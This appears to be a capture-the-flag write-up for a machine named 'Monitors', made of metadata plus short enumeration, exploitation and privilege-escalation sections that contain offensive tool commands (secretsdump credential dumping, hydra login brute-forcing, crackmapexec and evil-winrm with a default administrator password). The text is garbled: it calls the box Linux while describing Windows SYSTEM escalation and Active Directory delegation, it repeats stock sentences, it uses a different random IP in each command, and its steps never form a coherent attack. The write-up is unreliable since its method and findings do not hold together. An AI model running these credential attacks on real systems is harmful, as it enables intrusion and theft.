---
TitleSEO: "PwnTillDawn — Monitors (Insane Linux) | ZureFX"
TitlePost: "PwnTillDawn — Monitors (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Monitors. Constrained Delegation and Unconstrained Delegation to achieve insane compromise on Linux."
Keywords: "offsec, active directory, web, medium, hackthebox, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-monitors-173.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-monitors-173/"
Date: "2025-11-30"
Tags: "OffSec, Active Directory, Web, Medium, HackTheBox, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-monitors-173"
Permalink: "/writeups/htb-monitors-173.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Monitors** is rated **Insane** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.98.85.165`.

### Objectives

The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.20.50.17 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

The backup files contained sensitive information that should not have been accessible. Weak file permissions allowed modification of critical system files.

### Service Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.49.39.182
```

The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine.

### Web Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.19.67.75 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.83.130.100 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Exploitation

### Vulnerability Identification

The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

Key finding: **Path Traversal**.

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

### Initial Access

Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
crackmapexec smb 10.48.42.193 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.54.140.53/FUZZ
```

Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Privilege Escalation

### Enumeration

Command injection was possible through unsanitized user input in the search functionality. Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
gobuster dir -u http://10.69.242.119/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p135,993,110 10.76.177.231 -oN scan.txt
```

### Exploitation

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
evil-winrm -i 10.52.254.125 -u administrator -p 'P@ssw0rd!'
```

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The kernel version was outdated and vulnerable to a publicly known exploit. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Summary

### Tools Used

- `sharphound`
- `atexec`
- `chisel`
- `ffuf`
- `crackmapexec`

### Key Takeaways

- Constrained Delegation
- Unconstrained Delegation
- SUID Binary
- Path Traversal
